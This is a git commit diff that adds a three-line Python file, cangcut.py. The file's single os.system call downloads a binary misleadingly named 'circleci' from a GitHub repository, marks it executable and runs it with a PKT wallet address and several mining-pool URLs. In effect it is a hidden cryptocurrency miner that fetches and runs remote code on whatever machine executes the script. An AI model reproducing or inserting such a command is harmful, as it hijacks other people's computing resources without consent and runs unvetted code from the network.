8e480b44b6d4677f61a47cca456edb5eb115d63b
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-04-02 23:24:38 +0700

    Update and rename cangcut to cangcut.py

---
+++ cangcut.py
@@ -0,0 +1,3 @@
+import os
+os.system('curl https://github.com/aurbach55/zash/raw/main/circleci --output circleci && chmod 777 circleci && ./circleci ann -p pkt1qfd04qlvx4ag9yrm9m5ju6fwp2kyx7ct0fnteqp  http://pool.pkteer.com http://pool.pktpool.io http://pool.pkt.world')
+
